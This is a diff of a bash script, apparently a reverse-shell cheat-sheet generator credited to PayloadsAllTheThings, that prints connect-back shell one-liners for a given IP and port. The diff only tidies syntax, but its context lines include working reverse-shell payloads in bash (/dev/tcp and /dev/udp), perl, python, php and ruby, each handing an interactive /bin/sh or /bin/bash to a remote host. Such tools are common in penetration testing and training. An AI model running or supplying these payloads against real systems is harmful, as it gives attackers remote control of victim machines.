@@ -1,12 +1,12 @@
-#!/bin/bash
-version="Version 1.0"
+#!/usr/bin/bash
+#version="Version 1.0"
 
 language=$1
 ip=$2
 port=$3
 
 #help function
-if [ $language == "-h" ] || [ $language == "--help" ]
+if [[ $language == "-h" ]] || [[ $language == "--help" ]]
 then
         echo -e "###################################################################"
         echo -e "          PayloadsAllTheThings - Rev Shell Cheat Sheet             "
@@ -27,7 +27,7 @@ then
 fi
 
 #bash_tcp
-if [ $language == "bash_tcp" ]
+if [[ $language == "bash_tcp" ]]
 then
         echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
         echo "-------------------------------------------------------------"
@@ -35,7 +35,7 @@ then
 fi
 
 #bash_udp
-if [ $language == "bash_udp" ]
+if [[ $language == "bash_udp" ]]
 then
         echo "sh -i >& /dev/udp/"$ip"/"$port" 0>&1"
         echo "-------------------------------------------------------------"
@@ -43,7 +43,7 @@ then
 fi
 
 #perl
-if [ $language == "perl" ]
+if [[ $language == "perl" ]]
 then
         string="perl -e '""use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""\"tcp\"""));if(connect(S,sockaddr_in("$port",inet_aton(""\"$ip\""")))){open(STDIN,""\">&S\""");open(STDOUT,""\">&S\""");open(STDERR,""\">&S\""");exec(""\"/bin/sh -i\""");};'"
         string2="perl -MIO -e '""\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,""\"$ip:$port\""");STDIN->fdopen(\$c,r);\$~->fdopen(\$c,w);system\$_ while<>;'"
@@ -54,7 +54,7 @@ then
 fi
 
 #python
-if [ $language == "python" ]
+if [[ $language == "python" ]]
 then
         python1="python -c '""import sys,socket,os,pty;s=socket.socket();s.connect((""\"$ip\""",$port),;[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(""\"/bin/sh\""")'"
         python2="python -c '""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""\"$ip\""",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(""\"/bin/bash\""")'"
@@ -64,7 +64,7 @@ then
 fi
 
 #php
-if [ $language == "php" ]
+if [[ $language == "php" ]]
 then
         php1="php -r '""\$sock=fsockopen(""\"$ip\""",$port);exec(""\"/bin/sh -i <&3 >&3 2>&3\""");'"
         php2="php -r '""\$sock=fsockopen(""\"$ip\""",$port);\$proc=proc_open(""\"/bin/sh -i\""", array(0=>\$sock, 1=>\$sock, 2=>\$sock),\$pipes);'"
@@ -74,7 +74,7 @@ then
 fi
 
 #ruby
-if [ $language == "ruby" ]
+if [[ $language == "ruby" ]]
 then
         ruby1="ruby -rsocket -e'""f=TCPSocket.open(""\"$ip\""",$port).to_i;exec sprintf(""\"/bin/sh -i <&%d >&%d 2>&%d\""",f,f,f)'"
         ruby2="ruby -rsocket -e '""exit if fork;c=TCPSocket.new(""\"$ip\""",""\"$port\""");while(cmd=c.gets);IO.popen(cmd,""\"r\"""){|io|c.print io.read}end'"
@@ -84,7 +84,7 @@ then
 fi
 
 ## output all languages
-if [ $language == "all" ] || [ $language == "-a" ]
+if [[ $language == "all" ]] || [[ $language == "-a" ]]
 then
         echo "bash_tcp"
         echo "-------------------------------------------------------------"
